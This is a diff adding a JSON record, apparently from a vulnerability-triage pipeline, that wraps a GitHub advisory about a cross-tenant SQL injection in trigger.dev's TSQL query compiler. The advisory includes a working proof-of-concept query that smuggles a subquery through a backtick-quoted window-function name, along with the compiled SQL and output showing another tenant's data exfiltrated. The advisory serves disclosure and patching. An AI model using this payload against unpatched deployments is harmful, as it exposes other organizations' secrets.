@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 0, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/86569763?v=4\", \"events_url\": \"https://api.github.com/users/sajdakabir/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/sajdakabir/followers\", \"following_url\": \"https://api.github.com/users/sajdakabir/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/sajdakabir/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/sajdakabir\", \"id\": 86569763, \"login\": \"sajdakabir\", \"node_id\": \"MDQ6VXNlcjg2NTY5NzYz\", \"organizations_url\": \"https://api.github.com/users/sajdakabir/orgs\", \"received_events_url\": \"https://api.github.com/users/sajdakabir/received_events\", \"repos_url\": \"https://api.github.com/users/sajdakabir/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/sajdakabir/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/sajdakabir/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/sajdakabir\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": 7.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-89\", \"name\": \"Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"}, {\"cwe_id\": \"CWE-639\", \"name\": \"Authorization Bypass Through User-Controlled Key\"}], \"description\": \"### Summary\\n\\nA cross-tenant SQL injection in the TSQL query compiler lets **any authenticated trigger.dev customer read every other tenant's analytics data**. The customer-facing query endpoint `POST /api/v1/query` accepts a TSQL/TRQL query that is compiled to ClickHouse SQL by `internal-packages/tsql`. The compiler parameterizes or escapes all user input and injects a per-tenant `WHERE` guard — **except the window-function name**, which is concatenated into the SQL string with no allowlist and no escaping. By smuggling a backtick-quoted identifier into that position, an attacker injects a raw subquery (e.g. `(SELECT ... FROM task_runs_v2 WHERE organization_id = 'org_VICTIM')`) that sits **outside** the tenant guard, exfiltrating another organization's rows. Verified end-to-end against the real compiler and a live ClickHouse.\\n\\n### Details\\n\\n**Vulnerable sink** — `internal-packages/tsql/src/query/printer.ts:3073-3075`, `ClickHousePrinter.visitWindowFunction`:\\n\\n```ts\\nprivate visitWindowFunction(node: WindowFunction): string {\\n  const args = node.args ? node.args.map((a) => this.visit(a)) : [];\\n  const funcCall = `${node.name}(${args.join(\\\", \\\")})`;   // <-- node.name concatenated RAW\\n  ...\\n}\\n```\\n\\n`node.name` is emitted directly into the SQL with **no allowlist check and no identifier escaping**. This is the only place in the compiler where an attacker-influenced identifier reaches the output unguarded:\\n\\n- The normal function-call path `visitCall` (`printer.ts:2951`) throws `Unknown function` for any name outside the hardcoded `TSQL_CLICKHOUSE_FUNCTIONS` / `TSQL_AGGREGATIONS` allowlists — **this gate is absent on the window-function path**.\\n- String constants are bound as ClickHouse `query_params` (parameterized).\\n- Other identifiers go through `escapeClickHouseIdentifier`.\\n- Table functions (`url()/file()/remote()/s3()`) are rejected.\\n\\nA **backtick-quoted identifier** is accepted by the lexer and **unescaped** into `node.name` by `visitIdentifier` (the backticks are stripped and the inner text is unescaped), so arbitrary characters — spaces, `(`, `)`, `,`, `'`, a full subquery — become the \\\"function name\\\" and are printed verbatim.\\n\\n**How it bypasses tenant isolation.** Multi-tenancy is enforced only by `enforcedWhereClause`, which is attached to the **outer** table's `WHERE` (`organization_id`/`project_id`/`environment_id` taken from the caller's API key). An injected **subquery** has no such guard, so it reads across all tenants.\\n\\n**Reachability** — `apps/webapp/app/routes/api.v1.query.ts`:\\n- `body.query` is a raw `z.string()`.\\n- Auth is any environment-scoped credential — a private API key or a public JWT — i.e. **any signed-up customer**.\\n- The route's authorization (`detectTables(body.query)` + `everyResource`) only authorizes the **outer `FROM` table** the caller is legitimately allowed to read. The injection rides in the SELECT/window position, so it is invisible to that check.\\n- `executeQuery` passes the caller's `organizationId/projectId/environmentId` into the enforced `WHERE`. The compiled `sql` string is then sent to ClickHouse (`internal-packages/clickhouse/src/client/tsql.ts`) with the injected subquery embedded **in the SQL string itself** (not in bound params), so ClickHouse executes it.\\n\\n### PoC\\n\\nReproduced in two stages: (1) the project's real `compileTSQL` emits the injection; (2) a live ClickHouse executes it and returns another tenant's data.\\n\\n**1. Attacker TSQL input** (sent as the `query` field to `POST /api/v1/query` with any valid API key / JWT, authenticated here as `tenant1`):\\n\\n```sql\\nSELECT `count() OVER (), (SELECT groupArray(payload) FROM trigger_dev.task_runs_v2 WHERE organization_id = 'org_OTHER_TENANT') AS stolen, dummy(`() OVER () AS x FROM task_runs\\n```\\n\\n**2. Compiled ClickHouse SQL emitted by `compileTSQL` (verbatim):**\\n\\n```sql\\nSELECT count() OVER (),\\n       (SELECT groupArray(payload) FROM trigger_dev.task_runs_v2\\n        WHERE organization_id = 'org_OTHER_TENANT') AS stolen,        -- INJECTED, RAW, UNGUARDED\\n       dummy(() OVER () AS x\\nFROM trigger_dev.task_runs_v2 AS task_runs\\nWHERE and(equals(task_runs.organization_id, {tsql_val_0: String}),\\n          equals(task_runs.project_id,      {tsql_val_1: String}),\\n          equals(task_runs.environment_id,  {tsql_val_2: String}))    -- guard ONLY on outer table\\nLIMIT 10000\\n```\\n\\nThe injected subquery against `org_OTHER_TENANT` is emitted raw (its org id is a literal, not a bound `{tsql_val}` param) and sits outside the tenant guard.\\n\\n**3. Live ClickHouse execution.** A `trigger_dev.task_runs_v2` table seeded with two tenants; a syntactically-valid variant of the above run as a caller scoped to `org_tenant1`:\\n\\n```\\nSeed:\\n  org_tenant1      -> payload 'tenant1-public-data'                         (attacker's own org)\\n  org_OTHER_TENANT -> 'VICTIM-SECRET-stripe_sk_live_DEADBEEF',\\n                      'VICTIM-SECRET-db_password_hunter2'                    (victim)\\n\\nBaseline (legitimate tenant1 query, guard = org_tenant1):\\n  -> 'tenant1-public-data'                                                  (only own data)\\n\\nExploit (injected subquery, guard STILL org_tenant1):\\n  SELECT 1 AS keep,\\n         (SELECT groupArray(payload) FROM trigger_dev.task_runs_v2 WHERE organization_id = 'org_OTHER_TENANT') AS stolen,\\n         count() OVER () AS w\\n  FROM trigger_dev.task_runs_v2 AS task_runs\\n  WHERE and(equals(task_runs.organization_id, 'org_tenant1'), ...)\\n  -> stolen = ['VICTIM-SECRET-stripe_sk_live_DEADBEEF','VICTIM-SECRET-db_password_hunter2']\\n```\\n\\nA caller scoped to `org_tenant1` exfiltrated `org_OTHER_TENANT`'s secret payloads — cross-tenant SQL injection confirmed against the real compiler and a live ClickHouse.\\n\\n**Reproduce the compiler step** with a vitest in `internal-packages/tsql` (mirrors the repo's `src/query/security.test.ts` tenant setup): compile the attacker string above with `enforcedWhereClause` set to `org_tenant1` and assert the output contains `(SELECT groupArray(payload) FROM trigger_dev.task_runs_v2 WHERE organization_id = 'org_OTHER_TENANT')`. Then run that SQL against a ClickHouse seeded as above.\", \"ghsa_id\": \"GHSA-9q4r-4842-93vw\", \"github_reviewed_at\": \"2026-10-02T22:42:20Z\", \"html_url\": \"https://github.com/advisories/GHSA-9q4r-4842-93vw\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-9q4r-4842-93vw\"}], \"nvd_published_at\": null, \"published_at\": \"2026-10-02T22:42:20Z\", \"references\": [\"https://github.com/triggerdotdev/trigger.dev/security/advisories/GHSA-9q4r-4842-93vw\", \"https://github.com/triggerdotdev/trigger.dev/pull/4316\", \"https://github.com/triggerdotdev/trigger.dev/commit/6997aeb05e27d2db47f9eda01fdc8a17c81a1ae0\", \"https://github.com/triggerdotdev/trigger.dev/releases/tag/v4.5.6\", \"https://github.com/advisories/GHSA-9q4r-4842-93vw\"], \"repository_advisory_url\": \"https://api.github.com/repos/triggerdotdev/trigger.dev/security-advisories/GHSA-9q4r-4842-93vw\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/triggerdotdev/trigger.dev\", \"summary\": \"Trigger.dev: Cross-tenant SQL injection in the TSQL query compiler (POST /api/v1/query) via unsanitized window-function name\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-02T22:42:23Z\", \"url\": \"https://api.github.com/advisories/GHSA-9q4r-4842-93vw\", \"vulnerabilities\": [{\"first_patched_version\": \"4.5.6\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"trigger.dev\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 4.5.5\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-9q4r-4842-93vw",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "trigger.dev: <= 4.5.5"
+    ],
+    "authentication_required": true,
+    "cves": [],
+    "cvss_score": 7.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "trigger.dev"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-10-03T19:59:33.294294Z",
+  "provenance": {
+    "content_sha256": "30eedcfef0cad57b122d157de67905f0f84f52ff10d3bd104c16ca154d2f5ee5",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-02T22:42:20Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-9q4r-4842-93vw",
+  "status": "active",
+  "title": "Trigger.dev: Cross-tenant SQL injection in the TSQL query compiler (POST /api/v1/query) via unsanitized window-function name",
+  "updated_at": "2026-10-02T22:42:23Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-9q4r-4842-93vw"
+}
